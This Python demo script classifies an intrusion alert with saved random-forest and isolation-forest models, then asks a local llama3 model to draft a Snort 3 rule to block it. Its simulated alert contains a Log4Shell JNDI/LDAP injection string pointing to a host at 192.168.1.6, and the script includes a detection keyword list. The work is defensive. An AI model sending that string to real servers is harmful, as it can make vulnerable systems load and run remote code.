import joblib
import ollama
import pandas as pd
import re

def engineer_features_for_single_alert(alert_info):
    """
    Performs the same feature engineering on a single new alert
    that was done on the training data.
    """
    message = alert_info['message']
    
    df = pd.DataFrame([{
        'message': message,
        'dest_port': int(alert_info['dest_port'])
    }])
    
    df['message_length'] = df['message'].str.len()
    special_chars = r'[\$\{\}\(\)\'\/]'
    df['special_char_count'] = df['message'].str.count(special_chars)
    keywords = ['select', 'union', 'script', 'jndi', 'ldap', 'payload']
    keyword_pattern = '|'.join(keywords)
    df['keyword_count'] = df['message'].str.lower().str.count(keyword_pattern)
    
    return df[['dest_port', 'message_length', 'special_char_count', 'keyword_count', 'message']]


def generate_snort_rule_prompt(alert_info):
    """
    Constructs a stricter prompt for Ollama to generate a Snort rule.
    Includes explicit DO and DO NOT examples.
    """
    src_ip = alert_info['source_ip']
    dst_port = alert_info['dest_port']
    
    prompt = f"""
    You are a Snort 3 expert. Write a strict Snort 3 rule to block the following threat.
    
    THREAT DETAILS:
    - Source IP: {src_ip}
    - Destination Port: {dst_port}
    - Payload: "{alert_info['message']}"

    STRICT FORMATTING RULES:
    1. Use the standard header format: alert tcp <SRC_IP> any -> any <DST_PORT>
    2. Do NOT use words like "src ip" or "dst port" in the header.
    3. Do NOT include markdown code fences (```).
    4. Ensure the rule options are enclosed in parentheses.

    CORRECT EXAMPLE (Follow this structure):
    alert tcp {src_ip} any -> any {dst_port} (msg:"Detected Malicious Payload"; content:"payload"; sid:1000020; rev:1;)

    INCORRECT EXAMPLE (Never do this):
    alert tcp src ip {src_ip} dst port {dst_port} ...

    OUTPUT:
    Provide ONLY the valid Snort rule line. Nothing else.
    """
    return prompt

# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load models
    try:
        classifier_pipeline = joblib.load('random_forest_pipeline.joblib')
        anomaly_pipeline = joblib.load('isolation_forest_pipeline.joblib')
    except FileNotFoundError as e:
        print(f"Error: Could not find model file: {e.filename}")
        exit()

    # 2. Simulate Alert
    new_alert_info = {
        'message': 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1',
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # 3. Predict
    new_alert_df = engineer_features_for_single_alert(new_alert_info)
    classifier_prediction = classifier_pipeline.predict(new_alert_df)
    anomaly_prediction = anomaly_pipeline.predict(new_alert_df)

    print("--- Hybrid Model Analysis ---")
    print(f"Classifier Prediction: {'MALICIOUS' if classifier_prediction[0] == 1 else 'Benign'}")
    print(f"Anomaly Prediction:    {'ANOMALY' if anomaly_prediction[0] == -1 else 'Normal'}")
    print("-----------------------------")

    if classifier_prediction[0] == 1 or anomaly_prediction[0] == -1:
        print("\nSUCCESS: Threat detected.")
        print("Asking Ollama to generate a valid Snort rule...")
        
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3',
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            rule = response['message']['content']
            
            # --- Post-Processing / Cleaning ---
            rule = rule.replace('```', '').replace('snort', '').strip()
            # Remove common LLM hallucinations if they appear
            rule = rule.replace('src ip', '').replace('dst port', '') 
            # Fix double spaces caused by removal
            rule = re.sub(' +', ' ', rule)
            
            print("\n--- Suggested Rule ---")
            print(rule)
            print("----------------------")

            with open("suggested_rules.txt", "w") as f: # Overwrite to keep it clean for the demo
                f.write(f"# Rule for Log4j\n")
                f.write(rule + "\n")
            print("Rule saved to suggested_rules.txt")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
    else:
        print("\nSystem classified threat as Benign.")